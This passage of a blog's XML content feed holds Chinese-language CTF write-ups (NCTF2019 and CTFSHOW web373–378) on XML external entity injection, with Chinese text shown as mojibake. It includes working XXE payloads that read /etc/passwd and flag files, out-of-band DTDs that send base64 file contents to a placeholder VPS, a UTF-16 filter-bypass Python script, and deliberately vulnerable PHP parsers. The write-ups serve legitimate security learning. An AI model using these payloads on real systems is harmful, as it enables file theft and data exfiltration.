class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;sleep 3&quot;</span>); </span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execFile</span>(<span class="string">&quot;/bin/sleep&quot;</span>,[<span class="string">&quot;3&quot;</span>]); *<span class="comment">//è°ƒç”¨æŸä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œåœ¨ç¬¬äºŒä¸ªå‚æ•°ä¼ args* </span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">spawn</span>(<span class="string">&#x27;sleep&#x27;</span>, [<span class="string">&#x27;3&#x27;</span>]); </span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">spawnSync</span>(<span class="string">&#x27;sleep&#x27;</span>, [<span class="string">&#x27;3&#x27;</span>]); </span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execFileSync</span>(<span class="string">&#x27;sleep&#x27;</span>, [<span class="string">&#x27;3&#x27;</span>])</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nodejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE wp</title>
      <link href="/2023/08/03/XXE%20wp/"/>
      <url>/2023/08/03/XXE%20wp/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h1><p>æ‰“å¼€åå‘ç°ä¸€ä¸ªç™»é™†ç•Œé¢</p><p>æ²¡æœ‰ä»€ä¹ˆæç¤ºä¿¡æ¯ï¼Œå°è¯•ç”¨bpæŠ“ä¸ªåŒ…ï¼š</p><p><img src="/img/XXE-wp/xxe_04.png" alt=""></p><p>å°è¯•xxeæ–‡ä»¶è¯»å–æµ‹è¯•ï¼š</p><p><img src="/img/XXE-wp/xxe_05.png" alt=""></p><p>æˆåŠŸå›æ˜¾ï¼å°è¯•è¯»å–flagï¼š</p><p><img src="/img/XXE-wp/xxe_06.png" alt=""></p><p>è¯»å–å¤±è´¥ï¼Œå°è¯•è¯»å–å…¶ä»–æ•æ„Ÿæ–‡ä»¶ï¼ˆ<code>/etc/hosts</code>ï¼Œ<code>/proc/net/fib_trie</code>ï¼Œ<code>/proc/net/arp</code>ï¼‰:</p><p>è¯»å–<code>/etc/hosts</code>ï¼š</p><p><img src="/img/XXE-wp/xxe_09.png" alt=""></p><p>è¯»å–<code>/proc/net/fib_trie</code>ï¼š</p><p><img src="/img/XXE-wp/xxe_08.png" alt=""></p><p>è¯»å–<code>/proc/net/arp</code>ï¼š</p><p><img src="/img/XXE-wp/xxe_07.png" alt=""></p><p>å‘ç°æœ‰å‡ ä¸ªipï¼Œåˆ†åˆ«å°è¯•è®¿é—®ä¸€ä¸‹ï¼š</p><p>å‘ç°è®¿é—®10.244.80.230æ—¶ï¼Œå‡ºç°æŠ¥é”™ï¼š</p><p><img src="/img/XXE-wp/xxe_10.png" alt=""></p><p>å°è¯•bpçˆ†ç ´Cæ®µï¼š</p><p>çˆ†ç ´æˆåŠŸï¼</p><p><img src="/img/XXE-wp/xxe_11.png" alt=""></p><h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><p>æ‰“å¼€åå‘ç°ä¸€ä¸ªç™»é™†ç•Œé¢</p><p>æ²¡æœ‰ä»€ä¹ˆæç¤ºä¿¡æ¯ï¼Œå°è¯•ç”¨bpæŠ“ä¸ªåŒ…ï¼š</p><p><img src="/img/XXE-wp/xxe_01.png" alt=""></p><p>å‘ç°å¯èƒ½å­˜åœ¨xxeæ¼æ´ï¼š</p><p>å°è¯•ä¸€ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">    &lt;!ENTITY words &quot;Hello XXE !&quot;&gt;</span><br><span class="line">    ]&gt;</span><br><span class="line">&lt;root&gt;&amp;words;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p>éªŒè¯æˆåŠŸï¼Œå­˜åœ¨xxeï¼š</p><p><img src="/img/XXE-wp/xxe_02.png" alt=""></p><p>å°è¯•è¯»å–flagæ–‡ä»¶ï¼ŒæˆåŠŸï¼</p><p><img src="/img/XXE-wp/xxe_03.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW XXE</title>
      <link href="/2023/08/02/CTFSHOW%20XXE/"/>
      <url>/2023/08/02/CTFSHOW%20XXE/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="web373"><a href="#web373" class="headerlink" title="web373()"></a>web373()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br></pre></td></tr></table></figure><p>æ‰“å¼€åå‘ç°æ˜¯ä¸€ä¸²ä»£ç ï¼ŒæŸ¥çœ‹åå‘ç°ï¼Œæœ¬é¢˜å¯ä»¥å°†postä¼ è¿›æ¥çš„å†…å®¹å½“xmlè§£æï¼Œå¹¶ä¸”è®¾ç½®äº†ä¸€ä¸ªdomèŠ‚ç‚¹ï¼Œä¹Ÿå°±æ˜¯éœ€è¦æˆ‘ä»¬æ„é€ çš„æ ‡ç­¾éœ€è¦æœ‰ä¸€ä¸ª<code>&lt;ctfshow&gt;&lt;/ctfshow&gt;</code>çš„æ ‡ç­¾</p><ul><li>æ£€æµ‹æ˜¯å¦å­˜åœ¨xml</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">words</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ctfshow</span>&gt;</span>&gt;<span class="symbol">&amp;words;</span><span class="tag">&lt;/<span class="name">ctfshow</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/CTFSHOW-XXE/373.png" alt=""></p><p>å‘ç°å­˜åœ¨xmlæ¼æ´ï¼Œå°è¯•ç›´æ¥è¯»å–flagï¼ŒæˆåŠŸï¼</p><p><strong>payloadï¼š</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">words</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ctfshow</span>&gt;</span>&gt;<span class="symbol">&amp;words;</span><span class="tag">&lt;/<span class="name">ctfshow</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/CTFSHOW-XXE/373_01.png" alt=""></p><h1 id="web374-æ— å›æ˜¾xxe"><a href="#web374-æ— å›æ˜¾xxe" class="headerlink" title="web374(æ— å›æ˜¾xxe)"></a>web374(æ— å›æ˜¾xxe)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure><p><code>libxml_disable_entity_loader(false);</code>ï¼šè¿™è¡Œä»£ç å°†å¯ç”¨ XML å®ä½“åŠ è½½å™¨ï¼Œå…è®¸åŠ è½½å¤–éƒ¨å®ä½“</p><p>å‘ç°æœ¬é¢˜æ²¡æœ‰å›æ˜¾ï¼Œå¯ä»¥åˆ©ç”¨OOBå¤–å¸¦ï¼Œå°†æ•°æ®å¸¦åˆ°æˆ‘ä»¬çš„vpsä¸Š</p><p>vpsä¸Šçš„<code>flag.dtd</code>ï¼Œè¿™ä¸ªæ˜¯è¢«å¤–éƒ¨å¼•ç”¨çš„dtdï¼Œå¯ä»¥ç›´æ¥å†™å®ä½“ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % ccc &quot;&lt;!ENTITY &amp;#x25; aba SYSTEM &#x27;http://xxx.xxx.xxx.xxx:12345?x=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%ccc;</span><br><span class="line">%aba;</span><br><span class="line">//è¿™ä¸ª&amp;#x25æ˜¯character entity reference(å­—ç¬¦ä¸²å®ä½“å¼•ç”¨) ï¼Œåæ¥é¢„å…ˆå®šä¹‰çš„å®ä½“åç§°ï¼ŒåµŒå¥—çš„æ—¶å€™ç›´æ¥åŠ ä¸Š</span><br></pre></td></tr></table></figure><p>cccå®ä½“é‡Œé¢åµŒå¥—äº†ä¸€ä¸ªå®ä½“abaï¼Œabaå®ä½“æ˜¯ä¸€ä¸ªå¤–éƒ¨å®ä½“</p><p>ç”¨æ¥è®¿é—®vpsç›‘å¬çš„ç«¯å£ï¼Œå¹¶æºå¸¦fileçš„å€¼ï¼Œå¼•ç”¨cccå®ä½“ï¼Œå¼•ç”¨abaå®ä½“</p><p><strong>payloadï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % xxe SYSTEM &quot;http://xxx.xxx.xxx.xxx/flag.dtd&quot;&gt;</span><br><span class="line">    %xxe;</span><br><span class="line">    ]&gt;</span><br></pre></td></tr></table></figure><p>åœ¨vpså¼€å¯httpæœåŠ¡ï¼š</p><blockquote><p><code>python3 -m http.server 12345</code>ï¼ˆåœ¨<code>flag.dtd</code>åŒçº§ç›®å½•æ‰§è¡Œï¼‰</p></blockquote><p>åˆ©ç”¨bpå°†payloadå‘é€ï¼Œå³å¯åœ¨vpsä¸Šæ”¶åˆ°æ•°æ®ä¿¡æ¯ï¼š</p><p><img src="/img/CTFSHOW-XXE/374.png" alt=""></p><h1 id="web375-æ— å›æ˜¾-è¿‡æ»¤"><a href="#web375-æ— å›æ˜¾-è¿‡æ»¤" class="headerlink" title="web375(æ— å›æ˜¾+è¿‡æ»¤)"></a>web375(æ— å›æ˜¾+è¿‡æ»¤)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);   </span><br></pre></td></tr></table></figure><p>å‘ç°è·Ÿä¸Šé“é¢˜ä¸åŒçš„æ˜¯ï¼Œæœ¬é¢˜è¿‡æ»¤äº†xmlå¤´éƒ¨ä¿¡æ¯ï¼Œé‚£æˆ‘ä»¬å°±ä¸åŠ </p><p>æ“ä½œä¸ä¸Šé“é¢˜ä¸€æ ·</p><p><strong>payloadï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % xxe SYSTEM &quot;http://xxx.xxx.xxx.xxx/flag.dtd&quot;&gt;</span><br><span class="line">    %xxe;</span><br><span class="line">    ]&gt;</span><br></pre></td></tr></table></figure><h1 id="web376"><a href="#web376" class="headerlink" title="web376()"></a>web376()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure><p>emmmï¼Œçœ‹äº†åŠå¤©ï¼Œå‘ç°è·Ÿä¸Šé“é¢˜ä¸€æ ·</p><p><code>O.o</code></p><h1 id="web377"><a href="#web377" class="headerlink" title="web377()"></a>web377()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure><p>å‘ç°ä¸ä»…è¿‡æ»¤äº†xmlå¤´éƒ¨ä¿¡æ¯ï¼Œè¿˜è¿‡æ»¤äº†http</p><p>å¯ä»¥ä½¿ç”¨ç¼–ç ç»•è¿‡ï¼Œè¿™é‡Œä½¿ç”¨<code>utf-16</code>ç»“åˆpythonè„šæœ¬ï¼š</p><p><strong>payloadï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://470c58ae-7daa-43aa-b06d-71a244daab3f.challenge.ctf.show/&#x27;</span></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % aaa SYSTEM &quot;http://xxx/test.dtd&quot;&gt;</span></span><br><span class="line"><span class="string">%aaa;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;root&gt;123&lt;/root&gt;&quot;&quot;&quot;</span></span><br><span class="line">payload = payload.encode(<span class="string">&#x27;utf-16&#x27;</span>)</span><br><span class="line">requests.post(url ,data=payload)</span><br></pre></td></tr></table></figure><p>åœ¨vpsä¸Šå¼€å¯httpæœåŠ¡ï¼Œè¿è¡Œä¸Šè¿°ä»£ç ï¼Œå³å¯å¾—åˆ°ç¼–ç åçš„flag</p><h1 id="web378"><a href="#web378" class="headerlink" title="web378()"></a>web378()</h1><p>å‘ç°æ˜¯ä¸€ä¸ªç™»é™†é¡µé¢</p><p><img src="/img/CTFSHOW-XXE/378.png" alt=""></p><p>éšä¾¿è¾“ä¸ªå€¼ï¼ŒæŠ“åŒ…ï¼Œå‘ç°postå€¼ä¸ºxmlæ ¼å¼ï¼š</p><p><img src="/img/CTFSHOW-XXE/378_01.png" alt=""></p><p>æ£€æµ‹æ˜¯å¦å­˜åœ¨xxeï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">        &lt;!ENTITY hack SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">    ]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;hack;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><p><img src="/img/CTFSHOW-XXE/378_02.png" alt=""></p><p>å‘ç°å­˜åœ¨xxeï¼Œå°è¯•è¯»å–<code>/flag</code>ï¼š</p><p><strong>payloadï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">        &lt;!ENTITY hack SYSTEM &quot;file:///flag&gt;</span><br><span class="line">    ]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;hack;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><p>æˆåŠŸï¼</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFSHOW </tag>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE</title>
      <link href="/2023/07/31/XXE/"/>
      <url>/2023/07/31/XXE/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="XXEåŸºç¡€æ¦‚å¿µ"><a href="#XXEåŸºç¡€æ¦‚å¿µ" class="headerlink" title="XXEåŸºç¡€æ¦‚å¿µ"></a>XXEåŸºç¡€æ¦‚å¿µ</h1><p>XXE(XML External Entity Injection)å…¨ç§°ä¸ºXMLå¤–éƒ¨å®ä½“æ³¨å…¥ï¼Œç”±äºç¨‹åºåœ¨è§£æè¾“å…¥çš„XMLæ•°æ®æ—¶ï¼Œè§£æäº†æ”»å‡»è€…ä¼ªé€ çš„å¤–éƒ¨å®ä½“è€Œäº§ç”Ÿçš„ã€‚ä¾‹å¦‚PHPä¸­çš„simplexml_loadé»˜è®¤æƒ…å†µä¸‹ä¼šè§£æå¤–éƒ¨å®ä½“ï¼Œæœ‰XXEæ¼æ´çš„æ ‡å¿—æ€§å‡½æ•°ä¸ºsimplexml_load_string()ã€‚è€Œå­¦ä¹ XXEè¦ä»è®¤è¯†XMLå¼€å§‹ã€‚</p><h1 id="XMLåŸºç¡€"><a href="#XMLåŸºç¡€" class="headerlink" title="XMLåŸºç¡€"></a>XMLåŸºç¡€</h1><p>XML æŒ‡å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼ˆEXtensible Markup Languageï¼‰<br>XML æ˜¯ä¸€ç§æ ‡è®°è¯­è¨€ï¼Œå¾ˆç±»ä¼¼ HTML<br>XML çš„è®¾è®¡å®—æ—¨æ˜¯ä¼ è¾“æ•°æ®ï¼Œè€Œéæ˜¾ç¤ºæ•°æ®<br>XML æ ‡ç­¾æ²¡æœ‰è¢«é¢„å®šä¹‰ã€‚æ‚¨éœ€è¦è‡ªè¡Œå®šä¹‰æ ‡ç­¾ã€‚<br>XML è¢«è®¾è®¡ä¸ºå…·æœ‰è‡ªæˆ‘æè¿°æ€§ã€‚<br>XML æ˜¯ W3C çš„æ¨èæ ‡å‡†</p><p><strong>XML æ˜¯ä¸ä½œä¸ºçš„ã€‚</strong></p><p> XML ä¸ä¼šåšä»»ä½•äº‹æƒ…ã€‚XML è¢«è®¾è®¡ç”¨æ¥ç»“æ„åŒ–ã€å­˜å‚¨ä»¥åŠä¼ è¾“ä¿¡æ¯ã€‚ã€</p><p><strong>ä¸¾ä¾‹ï¼š</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„è¿™æ¡ä¾¿ç­¾å…·æœ‰è‡ªæˆ‘æè¿°æ€§ã€‚å®ƒæ‹¥æœ‰æ ‡é¢˜ä»¥åŠç•™è¨€ï¼ŒåŒæ—¶åŒ…å«äº†å‘é€è€…å’Œæ¥å—è€…çš„ä¿¡æ¯ã€‚ä½†æ˜¯ï¼Œè¿™ä¸ª XML æ–‡æ¡£ä»ç„¶æ²¡æœ‰åšä»»ä½•äº‹æƒ…ã€‚å®ƒä»…ä»…æ˜¯åŒ…è£…åœ¨ XML æ ‡ç­¾ä¸­çš„çº¯ç²¹çš„ä¿¡æ¯ã€‚æˆ‘ä»¬éœ€è¦ç¼–å†™è½¯ä»¶æˆ–è€…ç¨‹åºï¼Œæ‰èƒ½ä¼ é€ã€æ¥æ”¶å’Œæ˜¾ç¤ºå‡ºè¿™ä¸ªæ–‡æ¡£ã€‚</p><p>é™¤æ­¤ä¹‹å¤–ï¼ŒXMLæ˜¯çº¯æ–‡æœ¬ï¼Œä¸”å…è®¸åˆ›ä½œè€…å®šä¹‰è‡ªå·±çš„æ 